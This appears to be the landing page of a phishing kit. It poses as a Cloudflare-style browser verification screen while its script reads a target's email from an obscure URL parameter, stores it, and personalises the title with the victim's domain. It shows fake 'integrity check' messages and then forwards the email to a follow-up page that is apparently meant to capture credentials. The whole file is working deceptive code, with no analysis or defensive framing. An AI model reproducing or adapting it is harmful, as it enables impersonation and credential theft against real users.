<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verification</title>

<style>
  body, html {
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    height: 100%;
    overflow: hidden;
    background: #1d1d1d;
    color: white;
  }

  #verification-overlay {
    position: fixed;
    inset: 0;
    background: #1d1d1d;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    opacity: 1;
    transition: opacity 1s ease;
    padding: 24px;
    text-align: center;
  }

  #verification-overlay.fade-out {
    opacity: 0;
    pointer-events: none;
  }

  /* Professional text sizing */
  #domain-title {
    font-size: 22px;
    font-weight: 600;
    margin: 0 0 10px;
    letter-spacing: -0.2px;
  }

  #security-msg {
    font-size: 14px;
    color: rgba(255, 255, 255, 0.72);
    margin: 0 0 24px;
    line-height: 1.4;
  }

  /* Mobile adjustments */
  @media (max-width: 480px) {
    #domain-title {
      font-size: 20px;
    }
    #security-msg {
      font-size: 13px;
    }
  }

  /* Desktop adjustments */
  @media (min-width: 481px) {
    #domain-title {
      font-size: 26px;
    }
    #security-msg {
      font-size: 15px;
    }
  }
</style>
</head>

<body>

<div id="verification-overlay">
  <h1 id="domain-title">Checking your browser...</h1>
  <p id="security-msg">Verifying you are human...</p>

  <div class="cf-turnstile"
       data-sitekey="0x4AAAAAABh8YRnURc-1UUi-"
       data-callback="onCaptchaSuccess">
  </div>
</div>

<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<script>
/* ===============================
   GET EMAIL EXACTLY AS IT IS
================================ */
function getEmailRaw() {
  const params = new URLSearchParams(window.location.search);
  return params.get("bazz505") || "";
}

// READ EMAIL FROM URL OR LOCAL STORAGE
let email = getEmailRaw();
if (!email) {
  email = localStorage.getItem("bazz505") || "";
}

// SAVE EMAIL TO LOCAL STORAGE
if (email) {
  localStorage.setItem("bazz505", email);
}

/* ===============================
   GET DOMAIN
================================ */
let domain = "";
if (email.includes("@")) {
  domain = email.split("@")[1];
}

// Optional: remove email from URL for cleanliness
history.replaceState({}, document.title, window.location.pathname);

/* ===============================
   UPDATE TITLE TEXT
================================ */
const title = document.getElementById("domain-title");
if (domain) {
  title.textContent = `Checking your browser before accessing ${domain}`;
}

/* ===============================
   VERIFICATION MESSAGE CYCLING
================================ */
const securityMsg = document.getElementById("security-msg");

const messages = [
  "Performing browser integrity check...",
  "Validating session security...",
  `Preparing secure access to ${domain}...`,
  "Verifying you are human..."
];

messages.forEach((msg, i) => {
  setTimeout(() => {
    securityMsg.textContent = msg;
  }, 1500 * i);
});

/* ===============================
   REDIRECT TO REVIEW.HTML
================================ */
function goToReview() {
  // PASS EMAIL EXACTLY â€” NO CHANGE
  window.location.href = `view.html?bazz505=${encodeURIComponent(email)}`;
}

/* ===============================
   CAPTCHA SUCCESS
================================ */
window.onCaptchaSuccess = () => {
  const overlay = document.getElementById("verification-overlay");
  overlay.classList.add("fade-out");
  setTimeout(goToReview, 900);
};

/* ===============================
   FAILSAFE REDIRECT
================================ */
setTimeout(() => {
  const overlay = document.getElementById("verification-overlay");
  overlay.classList.add("fade-out");
  setTimeout(goToReview, 900);
}, 5000);
</script>

</body>
</html>
